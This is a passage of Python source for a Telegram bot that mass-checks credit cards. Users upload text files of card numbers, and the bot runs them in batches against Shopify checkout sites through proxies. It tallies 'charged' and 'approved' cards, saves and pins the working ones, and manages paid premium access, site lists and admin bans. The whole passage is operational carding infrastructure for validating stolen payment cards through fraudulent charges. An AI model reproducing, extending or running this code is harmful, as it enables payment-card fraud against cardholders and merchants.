                [pbtn(f"📝 {last_response_display}", "none")],
                [pbtn(f"🌐 Site ━ {last_site_display}", "none")],
                [pbtn(f"💰 Charged ━ {charged}", "none")],
                [pbtn(f"✅ Approved ━ {approved}", "none")],
                [pbtn(f"❌ Declined ━ {declined}", "none")],
                [pbtn(f"⚠️ Errors ━ {errors}", "none")],
                [pbtn(f"📊 {checked}/{total}", "none")],
                [pbtn("🛑 Stop", f"stop_mtxt:{user_id}")]
            ]
            try:
                await styled_edit(status_msg, f"<pre>{PE} Processing batches of 20...</pre>", buttons=kb, emoji_ids=[CE["star"]])
            except Exception:
                pass

            idx += len(batch)

        final_caption = f"""{PE} <b>━━━━━━━━━━━━━━━━━━</b>
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}
"""
        final_kb = [
            [pbtn(f"💰 Charged ━ {charged}", "none")],
            [pbtn(f"✅ Approved ━ {approved}", "none")],
            [pbtn(f"📊 Total ━ {total}", "none")],
            [pbtn(f"📊 Checked ━ {checked}/{total}", "none")]
        ]
        try:
            await styled_edit(status_msg, final_caption, buttons=final_kb, emoji_ids=[CE["crown"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
        except Exception:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        if not can_stop:
            return await event.answer("```You can only stop your own process!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("```No active process found!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```CC checking stopped!```", alert=True)
    except Exception as e:
        await event.answer(f"```Error: {str(e)}```", alert=True)


@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    sites = await get_user_sites(event.sender_id)
    text = f"""{PE} <b>PROFILE</b>
━━━━━━━━━━━━━━━━━
User ID ━ <code>{event.sender_id}</code>
Plan ━ <b>{plan.upper()}</b>
Limit ━ <code>{limit}</code> CCs
Sites ━ {len(sites)}"""
    await styled_reply(event, text, emoji_ids=[CE["info"], CE["crown"]])


@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Only Admin Can Use This Command!", emoji_ids=[CE["stop"]])

    try:
        total_users = await get_total_users()
        total_premium = await get_premium_count()
        total_free = total_users - total_premium
        total_sites = await get_total_sites_count()
        users_with_sites = await get_users_with_sites()
        all_keys = await get_all_keys()
        total_keys = len(all_keys)
        used_keys = len([k for k in all_keys if k.get('used', False)])
        unused_keys = total_keys - used_keys
        total_cards = await get_total_cards_count()
        charged_cards = await get_charged_count()
        approved_cards = await get_approved_count()

        premium_users = await get_all_premium_users()
        sites_per_user = await get_sites_per_user()
        all_sites_detail = await get_all_sites_detail()

        stats_content = "? BOT STATISTICS REPORT ?\n"
        stats_content += "?" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"━ Generated: {current_time}\n\n"

        stats_content += "? USER STATISTICS\n"
        stats_content += "?" * 30 + "\n"
        stats_content += f"━ Total Unique Users: {total_users}\n"
        stats_content += f"━ Premium Users: {total_premium}\n"
        stats_content += f"━ Free Users: {total_free}\n\n"

        if premium_users:
            stats_content += "? PREMIUM USERS DETAILS\n"
            stats_content += "?" * 30 + "\n"
            for user_row in premium_users:
                uid = user_row['user_id']
                expiry_date = user_row['expiry']
                current_date = datetime.datetime.utcnow()
                if expiry_date:
                    status_str = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                    days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0
                else:
                    status_str = "NO EXPIRY"
                    days_remaining = 0
                stats_content += f"User ID: {uid}\n"
                stats_content += f"  Status: {status_str}\n"
                stats_content += f"  Days Given: {user_row.get('premium_days', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        stats_content += "\n? SITES STATISTICS\n"
        stats_content += "?" * 30 + "\n"
        stats_content += f"━ Total Sites Added: {total_sites}\n"
        stats_content += f"━ Users with Sites: {users_with_sites}\n"

        if sites_per_user:
            stats_content += f"\nSites per User:\n"
            for row in sites_per_user:
                stats_content += f"  User {row['user_id']}: {row['cnt']} sites\n"

        if all_sites_detail:
            current_uid = None
            for row in all_sites_detail:
                if row['user_id'] != current_uid:
                    current_uid = row['user_id']
                    stats_content += f"\n  User {current_uid}:\n"
                stats_content += f"    - {row['site']}\n"

        stats_content += f"\n KEYS STATISTICS\n"
        stats_content += "?" * 30 + "\n"
        stats_content += f"━ Total Keys Generated: {total_keys}\n"
        stats_content += f"━ Used Keys: {used_keys}\n"
        stats_content += f"━ Unused Keys: {unused_keys}\n"

        if all_keys:
            stats_content += f"\nKeys Details:\n"
            for key_row in all_keys:
                kstatus = "USED" if key_row.get('used', False) else "UNUSED"
                stats_content += f"  Key: {key_row['key']}\n"
                stats_content += f"    Status: {kstatus}\n"
                stats_content += f"    Days Value: {key_row.get('days', 'N/A')}\n"
                stats_content += f"    Created: {key_row.get('created_at', 'N/A')}\n"
                if kstatus == "USED":
                    stats_content += f"    Used By: {key_row.get('used_by', 'N/A')}\n"
                    stats_content += f"    Used At: {key_row.get('used_at', 'N/A')}\n"
                stats_content += "-" * 15 + "\n"

        stats_content += f"\n ADMIN STATISTICS\n"
        stats_content += "?" * 30 + "\n"
        stats_content += f"━ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        stats_content += f"\n CARD STATISTICS\n"
        stats_content += "?" * 30 + "\n"
        stats_content += f"━ Total Processed Cards: {total_cards}\n"
        stats_content += f"━ Approved Cards: {approved_cards}\n"
        stats_content += f"━ Charged Cards: {charged_cards}\n"

        stats_content += "\n" + "?" * 50 + "\n"
        stats_content += "? END OF REPORT ?"

        tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', prefix='bot_stats_', delete=False, encoding='utf-8')
        stats_filename = tmp.name
        try:
            tmp.write(stats_content)
            tmp.close()

            await styled_reply(event, f"{PE} Statistics report generated", emoji_ids=[CE["chart"]], file=stats_filename)
        finally:
            try:
                os.remove(stats_filename)
            except OSError:
                pass

    except Exception as e:
        await styled_reply(event, f"{PE} Error generating stats: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ran_cmd(event):
    # === PLAN SYSTEM ===
    can_access, access_type, plan = await get_user_access(event)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    cc_limit = get_cc_limit(plan, event.sender_id)
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n━━━━━━━━━━━━━━━━━\nAdd one first:\n<code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["warn"]])

    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"<pre>{PE} Already processing ━ wait for completion</pre>", emoji_ids=[CE["star"]])
    
    try:
        if not event.reply_to_msg_id:
            return await styled_reply(event, f"<pre>{PE} Reply to a .txt file with /ran</pre>", emoji_ids=[CE["warn"]])
        
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await styled_reply(event, f"<pre>{PE} Reply to a .txt file with /ran</pre>", emoji_ids=[CE["warn"]])

        if not os.path.exists('sites.txt'):
            return await styled_reply(event, f"{PE} Sites file not found! Contact admin.", emoji_ids=[CE["cross"]])

        async with aiofiles.open('sites.txt', 'r') as f:
            sites_content = await f.read()
            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]

        if not global_sites:
            return await styled_reply(event, f"{PE} No sites available in sites.txt! Contact admin.", emoji_ids=[CE["cross"]])

        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f:
                lines = (await f.read()).splitlines()
        except Exception as e:
            try:
                os.remove(file_path)
            except:
                pass
            return await styled_reply(event, f"{PE} Error reading file: {e}", emoji_ids=[CE["cross"]])
        
        try:
            os.remove(file_path)
        except:
            pass
            
        # Extract cards
        cards = []
        for line in lines:
            card = extract_card(line)
            if card:
                cards.append(card)
        
        if not cards:
            return await styled_reply(event, f"{PE} No valid CCs found", emoji_ids=[CE["cross"]])

        # Apply plan limit
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await styled_reply(event, f"<pre>{PE} Found {total_cards_found} CCs\n━ Limit: {cc_limit} CCs\n{PE} Checking {len(cards)} CCs</pre>", emoji_ids=[CE["star"], CE["check"]])
        else:
            await styled_reply(event, f"<pre>{PE} Found {total_cards_found} valid CCs\n{PE} Checking all {len(cards)} CCs</pre>", emoji_ids=[CE["star"], CE["check"]])
        
        # Filter preference
        kb = [
            [pbtn("✅ Yes ━ Charged + Approved", f"ran_pref:yes:{user_id}")],
            [pbtn("❌ No ━ Only Charged", f"ran_pref:no:{user_id}")]
        ]

        pref_msg = await styled_reply(event,
            f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n"
            "<i>✅ Yes: Charged + Approved cards</i>\n"
            "❌ <i>No: Only Charged cards</i>",
            kb, emoji_ids=[CE["joker"], CE["gem"]]
        )

        USER_APPROVED_PREF[f"ran_{user_id}"] = {
            "cards": cards,
            "sites": global_sites,  # Fixed: use global_sites, not empty list
            "event": event,
            "pref_msg": pref_msg
        }

    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])
@client.on(events.CallbackQuery(pattern=rb"ran_pref:(yes|no):(\d+)"))
async def ran_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("This is not your session!", alert=True)

    key = f"ran_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("Session expired! Please try again.", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except Exception:
        pass

    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.answer("Already running!", alert=True)

    ACTIVE_MTXT_PROCESSES[user_id] = True
    await event.answer("Starting check...", alert=False)
    asyncio.create_task(process_ranfor_cards(data["event"], data["cards"], data["sites"], send_approved))


async def process_ranfor_cards(event, cards, global_sites, send_approved=True):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    is_private = event.chat.id == event.sender_id
    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    status_msg = await styled_reply(event, f"<pre>{PE} Processing ━ {mode_text}</pre>", emoji_ids=[CE["joker"]])
    BATCH_SIZE = 20
    last_card_display = ""
    last_response_display = ""

    try:
        idx = 0
        while idx < total:
            if not global_sites:
                await styled_edit(status_msg, f"{PE} <b>All sites dead</b>\nContact admin for fresh sites.", emoji_ids=[CE["cross"]])
                break

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""{PE} STOPPED
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Checked ━ {checked}/{total}
"""
                final_kb = [
                    [pbtn(f"💰 Charged ━ {charged}", "none")],
                    [pbtn(f"✅ Approved ━ {approved}", "none")],
                    [pbtn(f"🛑 Stopped ━ {checked}/{total}", "none")]
                ]
                try:
                    await styled_edit(status_msg, final_caption, buttons=final_kb, emoji_ids=[CE["stop"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
                except Exception:
                    pass
                return

            batch = cards[idx:idx + BATCH_SIZE]

            tasks = []
            for card in batch:
                if not global_sites:
                    break
                site = random.choice(global_sites)
                tasks.append(check_card_with_retries_ranfor(card, site, user_id, global_sites))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for i, (card, result) in enumerate(zip(batch, results)):
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-", "Status": "Error"}

                checked += 1
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                status = result.get("Status", "Declined")

                last_card_display = f"{card[:12]}****"
                last_response_display = result.get('Response', '')[:25]

                if status in ["SiteError", "Error"]:
                    errors += 1
                    continue

                if "cloudflare" in response_text_lower:
                    errors += 1
                    continue

                should_send_message = False
                header_emojis = []

                if status == "Charged":
                    charged += 1
                    status_header, header_emojis = get_status_header(status)
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif status == "Approved":
                    approved += 1
                    status_header, header_emojis = get_status_header(status)
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if send_approved:
                        should_send_message = True
                else:
                    declined += 1
                    status_header, header_emojis = get_status_header(status)

                if should_send_message:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    card_msg = f"""{status_header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {result.get('Gateway', 'Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {result.get('Response')}
Price ━ {result.get('Price')}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
"""
                    result_msg = await styled_reply(event, card_msg, emoji_ids=header_emojis)
                    if status == "Charged":
                        await pin_charged_message(event, result_msg)
                        if is_private:
                            await send_hit_notification(client, card, result, username, event.sender_id)

            kb = [
                [pbtn(f"💳 {last_card_display}", "none")],
                [pbtn(f"📝 {last_response_display}", "none")],
                [pbtn(f"💰 Charged ━ {charged}", "none")],
                [pbtn(f"✅ Approved ━ {approved}", "none")],
                [pbtn(f"❌ Declined ━ {declined}", "none")],
                [pbtn(f"⚠️ Errors ━ {errors}", "none")],
                [pbtn(f"📊 {checked}/{total}", "none")],
                [pbtn("🛑 Stop", f"stop_ranfor:{user_id}")]
            ]
            try:
                await styled_edit(status_msg, f"<pre>{PE} Processing batches of 20...</pre>", buttons=kb, emoji_ids=[CE["star"]])
            except Exception:
                pass

            idx += len(batch)

        final_caption = f"""{PE} <b>━━━━━━━━━━━━━━━━━━</b>
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}
"""
        final_kb = [
            [pbtn(f"💰 Charged ━ {charged}", "none")],
            [pbtn(f"✅ Approved ━ {approved}", "none")],
            [pbtn(f"📊 Total ━ {total}", "none")],
            [pbtn(f"📊 Checked ━ {checked}/{total}", "none")]
        ]
        try:
            await styled_edit(status_msg, final_caption, buttons=final_kb, emoji_ids=[CE["crown"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
        except Exception:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)


async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3):
    last_result = None
    for attempt in range(max_retries):
        result = await check_card_specific_site(card, site, user_id)
        status = result.get("Status", "")
        if status == "SiteError":
            if not global_sites:
                return {"Response": "All sites dead", "Price": "-", "Gateway": "Shopify", "Status": "Error"}
            site = random.choice(global_sites)
            last_result = result
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
        else:
            return result
    if last_result:
        last_result["Status"] = "Error"
        return last_result
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "Shopify", "Status": "Error"}


@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        if not can_stop:
            return await event.answer("```You can only stop your own process!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("```No active process found!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```CC checking stopped!```", alert=True)
    except Exception as e:
        await event.answer(f"```Error: {str(e)}```", alert=True)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]check\b'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    if not can_access:
        kb = [[pbtn("Use In Group Free", url="https://t.me/+pNplrRLrEGY5NTU0")]]
        await styled_reply(event, f"{PE} <b>Unauthorised Access!</b>\n\nYou can use this bot in group for free!\n\nFor private access, contact @MRROOTTG", kb, emoji_ids=[CE["stop"]])
        return

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await styled_reply(event, f"{PE} <b>Proxy Required!</b>\n\nPlease add a proxy first using:\n<code>/addpxy ip:port:username:password</code>\n\nOr without auth:\n<code>/addpxy ip:port</code>", emoji_ids=[CE["warn"]])

    check_text = re.sub(r'^[/.]check\s*', '', event.raw_text, flags=re.IGNORECASE).strip()

    if not check_text:
        kb = [
            [pbtn("🔍 Check My DB Sites", "check_db_sites")]
        ]

        instruction_text = f"""{PE} <b>Site Checker</b>

If you want to check sites then type:

<code>/check</code>
<code>1. https://example.com</code>
<code>2. https://site2.com</code>
<code>3. https://site3.com</code>

And if you want to check your DB sites and add working &amp; remove not working sites, click below button:"""

        await styled_reply(event, instruction_text, kb, emoji_ids=[CE["globe"]])
        return

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await styled_reply(event, f"{PE} No valid urls/domains found\n\n{PE} Example:\n<code>/check</code>\n<code>1. https://example.com</code>\n<code>2. site2.com</code>", emoji_ids=[CE["cross"], CE["warn"]])

    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await styled_reply(event, f"<pre>{PE} Found {total_sites_found} sites ━ checking first 10</pre>", emoji_ids=[CE["warn"]])

    asyncio.create_task(process_site_check(event, sites_to_check))


async def process_site_check(event, sites):
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await styled_reply(event, f"<pre>{PE} Checking {total_sites} sites...</pre>", emoji_ids=[CE["globe"]])

    try:
        batch_size = 10
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i+batch_size]
            tasks = []

            for site in batch:
                tasks.append(test_single_site(site, user_id=event.sender_id))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (site, result) in enumerate(zip(batch, results)):
                checked += 1
                if isinstance(result, Exception):
                    result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

                if result["status"] == "proxy_dead":
                    final_text = f"""{PE} <b>Proxy Dead</b>
━━━━━━━━━━━━━━━━━
{result['response']}

{PE} Working ━ {len(working_sites)}
{PE} Dead ━ {len(dead_sites)}
{PE} Checked ━ {checked}/{total_sites}"""
                    try:
                        await styled_edit(status_msg, final_text, emoji_ids=[CE["warn"], CE["tick"], CE["cross"], CE["star"]])
                    except Exception:
                        await styled_reply(event, final_text, emoji_ids=[CE["warn"], CE["tick"], CE["cross"], CE["star"]])
                    return

                if result["status"] == "working":
                    working_sites.append({"site": site, "price": result["price"]})
                else:
                    dead_sites.append({"site": site, "price": result["price"]})

                working_count = len(working_sites)
                dead_count = len(dead_sites)

                status_text = (
                    f"<pre>{PE} Checking Sites...\n\n"
                    f"{PE} Progress: [{checked}/{total_sites}]\n"
                    f"{PE} Working: {working_count}\n"
                    f"{PE} Dead: {dead_count}\n\n"
                    f"━ Current: {site}\n"
                    f"━ Status: {result['status'].upper()}\n"
                    f"━ Price: {result['price']}</pre>"
                )

                try:
                    await styled_edit(status_msg, status_text, emoji_ids=[CE["globe"], CE["star"], CE["tick"], CE["cross"]])
                except Exception:
                    pass

                await asyncio.sleep(0.1)

        final_emojis = [CE["globe"], CE["tick"], CE["cross"]]
        final_text = f"""{PE} <b>Site Check Complete</b>
━━━━━━━━━━━━━━━━━
{PE} Working ━ {len(working_sites)}
{PE} Dead ━ {len(dead_sites)}

"""
        if working_sites:
            final_text += "<b>Working Sites:</b>\n"
            for idx, site_data in enumerate(working_sites, 1):
                final_text += f"{PE} <code>{site_data['site']}</code> ━ {site_data['price']}\n"
                final_emojis.append(CE["tick"])
            final_text += "\n"

        if dead_sites:
            final_text += "<b>Dead Sites:</b>\n"
            for idx, site_data in enumerate(dead_sites, 1):
                final_text += f"{PE} <code>{site_data['site']}</code> ━ {site_data['price']}\n"
                final_emojis.append(CE["cross"])
            final_text += "\n"

        buttons = []
        if working_sites:
            TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]
            buttons.append([pbtn("✅ Add Working Sites to DB", f"add_working:{event.sender_id}")])

        if buttons:
            try:
                await styled_edit(status_msg, final_text, buttons=buttons, emoji_ids=final_emojis)
            except Exception:
                await styled_reply(event, final_text, buttons=buttons, emoji_ids=final_emojis)
        else:
            try:
                await styled_edit(status_msg, final_text, emoji_ids=final_emojis)
            except Exception:
                await styled_reply(event, final_text, emoji_ids=final_emojis)
    except Exception as e:
        try:
            await styled_edit(status_msg, f"{PE} Check failed: {e}", emoji_ids=[CE["cross"]])
        except Exception:
            await styled_reply(event, f"{PE} Check failed: {e}", emoji_ids=[CE["cross"]])


@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id

    user_sites = await get_user_sites(user_id)

    if not user_sites:
        return await event.answer("No sites added yet", alert=True)

    await event.answer("Checking DB sites...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))


async def process_db_site_check(event, user_sites):
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"<pre>{PE} Checking {total_sites} DB sites...</pre>"
    try:
        msg = await event.get_message()
        await styled_edit(msg, status_text, emoji_ids=[CE["globe"]])
    except Exception:
        pass

    try:
        batch_size = 10
        for i in range(0, len(user_sites), batch_size):
            batch = user_sites[i:i+batch_size]
            tasks = []

            for site in batch:
                tasks.append(test_single_site(site, user_id=user_id))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (site, result) in enumerate(zip(batch, results)):
                checked += 1
                if isinstance(result, Exception):
                    result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

                if result["status"] == "proxy_dead":
                    final_text = f"""{PE} <b>Proxy Dead</b>
━━━━━━━━━━━━━━━━━
{result['response']}

{PE} Working ━ {len(working_sites)}
{PE} Dead ━ {len(dead_sites)}
{PE} Checked ━ {checked}/{total_sites}"""
                    try:
                        msg = await event.get_message()
                        await styled_edit(msg, final_text, emoji_ids=[CE["warn"], CE["tick"], CE["cross"], CE["star"]])
                    except Exception:
                        pass
                    return

                if result["status"] == "working":
                    working_sites.append(site)
                else:
                    dead_sites.append(site)

                working_count = len(working_sites)
                dead_count = len(dead_sites)

                status_text = (
                    f"<pre>{PE} Checking DB Sites...\n\n"
                    f"{PE} Progress: [{checked}/{total_sites}]\n"
                    f"{PE} Working: {working_count}\n"
                    f"{PE} Dead: {dead_count}\n\n"
                    f"━ Current: {site}\n"
                    f"━ Status: {result['status'].upper()}</pre>"
                )

                try:
                    msg = await event.get_message()
                    await styled_edit(msg, status_text, emoji_ids=[CE["globe"], CE["star"], CE["tick"], CE["cross"]])
                except Exception:
                    pass

                await asyncio.sleep(0.1)

        # Remove dead sites from DB
        if dead_sites:
            for dead_site in dead_sites:
                await remove_site_db(user_id, dead_site)

        final_emojis = [CE["globe"], CE["tick"], CE["cross"]]
        final_text = f"""{PE} <b>DB Check Complete</b>
━━━━━━━━━━━━━━━━━
{PE} Working ━ {len(working_sites)}
{PE} Dead (Removed) ━ {len(dead_sites)}

"""

        if working_sites:
            final_text += "<b>Working Sites:</b>\n"
            for idx, site in enumerate(working_sites, 1):
                final_text += f"{PE} <code>{site}</code>\n"
                final_emojis.append(CE["tick"])
            final_text += "\n"

        if dead_sites:
            final_text += "<b>Dead Sites (Removed):</b>\n"
            for idx, site in enumerate(dead_sites, 1):
                final_text += f"{PE} <code>{site}</code>\n"
                final_emojis.append(CE["cross"])

        try:
            msg = await event.get_message()
            await styled_edit(msg, final_text, emoji_ids=final_emojis)
        except Exception:
            pass
    except Exception as e:
        try:
            msg = await event.get_message()
            await styled_edit(msg, f"{PE} DB check failed: {e}", emoji_ids=[CE["cross"]])
        except Exception:
            pass


@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:
            return await event.answer("? Not your check", alert=True)

        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])

        if not working_sites:
            return await event.answer("? No sites found ? run /check again", alert=True)

        added_sites = []
        already_exists = []

        for site in working_sites:
            success = await add_site_db(callback_user_id, site)
            if success:
                added_sites.append(site)
            else:
                already_exists.append(site)

        TEMP_WORKING_SITES.pop(callback_user_id, None)

        # Get updated count
        all_user_sites = await get_user_sites(callback_user_id)

        response_parts = []
        response_emojis = []
        if added_sites:
            added_text = f"{PE} <b>Added {len(added_sites)} Sites:</b>\n"
            response_emojis.append(CE["check"])
            for site in added_sites:
                added_text += f"{PE} <code>{site}</code>\n"
                response_emojis.append(CE["link"])
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"{PE} <b>{len(already_exists)} Already Exist:</b>\n"
            response_emojis.append(CE["warn"])
            for site in already_exists:
                exists_text += f"{PE} <code>{site}</code>\n"
                response_emojis.append(CE["link"])
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n━━━━━━━━━━━━━━━\n{PE} Total DB Sites: {len(all_user_sites)}"
            response_emojis.append(CE["star"])
        else:
            response_text = f"{PE} All sites already in DB"
            response_emojis = [CE["warn"]]

        await event.answer("Sites processed", alert=False)

        update_text = f"{PE} <b>Update:</b>\n{response_text}"
        update_emojis = [CE["star"]] + response_emojis

        try:
            msg = await event.get_message()
            await styled_edit(msg, update_text, emoji_ids=update_emojis)
        except Exception:
            await styled_send(event.chat_id, update_text, emoji_ids=update_emojis)

    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)


@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(event, f"{PE} Format: /unauth user_id", emoji_ids=[CE["warn"]])

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
            return await styled_reply(event, f"{PE} User {user_id} does not have premium access!", emoji_ids=[CE["cross"]])

        success = await remove_premium(user_id)

        if success:
            await styled_reply(event, f"{PE} Premium access removed for user {user_id}!", emoji_ids=[CE["check"]])
            try:
                await styled_send(user_id, f"{PE} Your Premium Access Has Been Revoked!\n\nYou can no longer use the bot in private chat.\n\nFor inquiries, contact @MRROOTTG", emoji_ids=[CE["warn"]])
            except Exception:
                pass
        else:
            await styled_reply(event, f"{PE} Failed to remove access for user {user_id}", emoji_ids=[CE["cross"]])

    except ValueError:
        await styled_reply(event, f"{PE} Invalid user ID!", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(event, f"{PE} Format: /ban user_id", emoji_ids=[CE["warn"]])

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await styled_reply(event, f"{PE} User {user_id} is already banned!", emoji_ids=[CE["cross"]])

        await ensure_user(user_id)
        await remove_premium(user_id)
        await ban_user(user_id, event.sender_id)

        await styled_reply(event, f"{PE} User {user_id} has been banned!", emoji_ids=[CE["check"]])

        try:
            await styled_send(user_id, f"{PE} You Have Been Banned!\n\nYou are no longer able to use this bot in private or group chat.\n\nFor appeal, contact @MRROOTTG", emoji_ids=[CE["stop"]])
        except Exception:
            pass

    except ValueError:
        await styled_reply(event, f"{PE} Invalid user ID!", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])

    try:
        parts = event.raw_text.split()
